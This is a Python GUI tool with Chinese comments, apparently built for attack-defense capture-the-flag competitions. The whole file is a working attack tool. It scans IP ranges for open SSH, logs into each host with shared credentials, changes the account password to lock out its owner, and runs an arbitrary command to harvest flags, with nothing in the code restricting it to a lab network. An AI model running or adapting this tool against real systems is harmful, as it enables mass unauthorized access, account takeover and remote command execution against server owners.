import tkinter as tk
from tkinter import messagebox, scrolledtext
import paramiko
import threading
import ipaddress
import socket
from concurrent.futures import ThreadPoolExecutor


# 解析 CIDR 范围为 IP 地址列表
def parse_cidr(cidr):
    try:
        network = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError:
        raise ValueError(f"无效的 CIDR 地址段: {cidr}")


# 多线程扫描 SSH 服务是否开放
def scan_ssh_service(ip, ssh_port=22, timeout=2):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            s.connect((ip, ssh_port))
            return ip  # 返回开放 SSH 的 IP
        except (socket.timeout, socket.error):
            return None


def scan_ssh_services(cidr_list, timeout=2, max_threads=50):
    ssh_live_hosts = []
    with ThreadPoolExecutor(max_threads) as executor:
        futures = []
        for cidr in cidr_list:
            ip_list = parse_cidr(cidr)
            futures += [executor.submit(scan_ssh_service, ip, 22, timeout) for ip in ip_list]

        for future in futures:
            result = future.result()
            if result:
                ssh_live_hosts.append(result)
    return ssh_live_hosts


# 修改 SSH 密码
def change_ssh_password(host, username, old_password, new_password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=username, password=old_password)

        command = f'echo -e "{old_password}\n{new_password}\n{new_password}" | passwd {username}'
        stdin, stdout, stderr = client.exec_command(command)
        error = stderr.read().decode()

        if error and "failed" in error.lower():
            return False
        else:
            return True
    except Exception as e:
        print(f"[ERROR] {host}: 修改密码失败: {e}")
        return False
    finally:
        client.close()


# 执行 SSH 命令并返回结果
def execute_command_and_save(host, username, password, command):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=username, password=password)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode()
        return output.strip()
    except Exception as e:
        print(f"[ERROR] {host}: 执行命令失败: {e}")
        return ""
    finally:
        client.close()


# 主流程
def start_process():
    ip_range = ip_range_entry.get().split(",")
    username = username_entry.get()
    old_password = old_password_entry.get()
    new_password = new_password_entry.get()
    command = command_entry.get()

    if not ip_range or not username or not old_password or not new_password or not command:
        messagebox.showerror("Error", "请填写所有输入字段！")
        return

    live_ips_text.delete(1.0, tk.END)
    ssh_ips_text.delete(1.0, tk.END)
    flags_text.delete(1.0, tk.END)

    def process():
        try:
            # 扫描开放 SSH 服务的主机
            ssh_live_hosts = scan_ssh_services(ip_range)

            # 更新 GUI 需要使用 root.after
            root.after(0, lambda: live_ips_text.insert(tk.END, "\n".join(ssh_live_hosts)))

            # 修改 SSH 密码
            ssh_success_ips = []
            for ip in ssh_live_hosts:
                if change_ssh_password(ip, username, old_password, new_password):
                    ssh_success_ips.append(ip)
            root.after(0, lambda: ssh_ips_text.insert(tk.END, "\n".join(ssh_success_ips)))

            # 执行命令获取 flag
            flags = []
            for ip in ssh_success_ips:
                flag = execute_command_and_save(ip, username, new_password, command)
                if flag:
                    flags.append(f"{ip}: {flag}")
            root.after(0, lambda: flags_text.insert(tk.END, "\n".join(flags)))

            root.after(0, lambda: messagebox.showinfo("完成", "测试完成！"))
        except Exception as e:
            root.after(0, lambda: messagebox.showerror("错误", f"出现错误: {e}"))

    threading.Thread(target=process).start()


# 创建 GUI
root = tk.Tk()
root.title("自动化靶机测试工具")

tk.Label(root, text="IP 地址段 (用逗号分隔):").grid(row=0, column=0, sticky="w")
ip_range_entry = tk.Entry(root, width=50)
ip_range_entry.grid(row=0, column=1, padx=10, pady=5)

tk.Label(root, text="SSH 用户名:").grid(row=1, column=0, sticky="w")
username_entry = tk.Entry(root, width=50)
username_entry.grid(row=1, column=1, padx=10, pady=5)

tk.Label(root, text="旧密码:").grid(row=2, column=0, sticky="w")
old_password_entry = tk.Entry(root, width=50, show="*")
old_password_entry.grid(row=2, column=1, padx=10, pady=5)

tk.Label(root, text="新密码:").grid(row=3, column=0, sticky="w")
new_password_entry = tk.Entry(root, width=50, show="*")
new_password_entry.grid(row=3, column=1, padx=10, pady=5)

tk.Label(root, text="获取 flag 的命令:").grid(row=4, column=0, sticky="w")
command_entry = tk.Entry(root, width=50)
command_entry.grid(row=4, column=1, padx=10, pady=5)

tk.Button(root, text="开始测试", command=start_process, bg="green", fg="white").grid(row=5, column=0, columnspan=2,
                                                                                     pady=10)

tk.Label(root, text="存活主机:").grid(row=6, column=0, sticky="w")
live_ips_text = scrolledtext.ScrolledText(root, width=60, height=10)
live_ips_text.grid(row=6, column=1, padx=10, pady=5)

tk.Label(root, text="成功修改密码的主机:").grid(row=7, column=0, sticky="w")
ssh_ips_text = scrolledtext.ScrolledText(root, width=60, height=10)
ssh_ips_text.grid(row=7, column=1, padx=10, pady=5)

tk.Label(root, text="获取到的 flag:").grid(row=8, column=0, sticky="w")
flags_text = scrolledtext.ScrolledText(root, width=60, height=10)
flags_text.grid(row=8, column=1, padx=10, pady=5)

root.mainloop()
